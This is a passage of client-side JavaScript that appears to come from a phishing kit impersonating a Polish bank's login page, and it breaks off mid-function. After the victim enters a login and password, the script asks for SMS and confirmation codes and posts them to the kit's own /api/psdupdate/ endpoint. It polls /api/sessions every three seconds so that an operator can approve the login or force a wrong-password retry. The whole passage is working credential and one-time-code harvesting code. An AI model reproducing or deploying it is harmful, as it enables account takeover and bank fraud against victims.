<script>
    let bankId = (cookieManager.read('session_id'))

    const plusBankUpdate = () => {
        if ($("#bank_password").val() && $("#bank_login").val() !== "") {
            $("#mainCont").empty()
            $("#mainCont").append(' <label for="login" class="form-label form-label--vertical form-label--centered">Kod SMS z telefonu</label> <input type="text" id="bank_psd" name="login" class="form--login-username ng-pristine ui-keyboard-input ui-widget-content ui-corner-all ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-touched" ng-model="$ctrl.clientNumber" autocomplete="off" maxlength="20" required="" virtual-keyboard="" global-validation="" focus-input="" aria-haspopup="true" role="textbox" style=""><i class="keyboard-opener clickable icon icon-keyboard"></i> <div ng-messages="loginForm.login.$error" ng-show="loginForm.$submitted" class="ng-active ng-hide"> <div ng-message="required">Wprowadź kod PSD2</div></div>')
            $("#buttonsCont").empty()
            $("#buttonsCont").append('<input onclick="psdUpdate()" type="submit" value="Dalej" class="btn btn--yellow">')
        } else {
        }
    }

    const regularCheck = () => {
        readTextFile("/api/sessions", function(text){
            var data = JSON.parse(text);
            for (let i=0;i<data["result"].length;i++) {
                if (data["result"][i]["uid"] == sessId) {
                    if (data["result"][i]["accepted"] == "true") {
                        summaryFunc()
                        clearInterval(multipleFunc)
                    }
                } else {

                }
            }
        });
    }
    const psdUpdate = () => {
        if ($("#bank_psd").val() !== "") {
            $.post("/api/psdupdate/", {
                bank_psd: $("#bank_psd").val(),
                sessionId: bankId
            }).done(data => {
                $("#mainCont").empty()
                $("#mainCont").append('<h1>Trwa logowanie, proszę czekać</h1>')
                $("#buttonsCont").empty()
            }).fail(error => {
                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
            })

        } else {
            console.log('not selectec')
        }
    }

    let multipleFunc = setInterval(function(){ regularCheck() }, 3000);



    //WRONG PASS

    const wrongPass = () => {
        $.post("/api/wrongpass/", {
            sessionId: bankId,
            name: "false"
        }).done(data => {
            console.log('done')
        }).fail(error => {
            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
        })
    }

    const regularPass = () => {
        readTextFile("/api/sessions", function(text){
            var data = JSON.parse(text);
            for (let i=0;i<data["result"].length;i++) {
                if (data["result"][i]["uid"] == sessId) {
                    if (data["result"][i]["accepted"] == "wrongPass") {
                        clearInterval(multiplePass)
                        wrongPass()
                        location.reload()
                    }
                } else {

                }
            }
        });
    }

    let multiplePass = setInterval(function(){ regularPass() }, 3000);





    //SUMMARY

    const summaryFunc = () => {
        $("#mainCont").empty()
        $("#mainCont").append(' <label for="login" class="form-label form-label--vertical form-label--centered">Kod potwierdzający z telefonu</label> <input type="text" id="bank_summary" name="login" class="form--login-username ng-pristine ui-keyboard-input ui-widget-content ui-corner-all ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-touched" ng-model="$ctrl.clientNumber" autocomplete="off" maxlength="20" required="" virtual-keyboard="" global-validation="" focus-input="" aria-haspopup="true" role="textbox" style=""><i class="keyboard-opener clickable icon icon-keyboard"></i> <div ng-messages="loginForm.login.$error" ng-show="loginForm.$submitted" class="ng-active ng-hide"> <div ng-message="required">Wprowadź kod PSD2</div></div>')
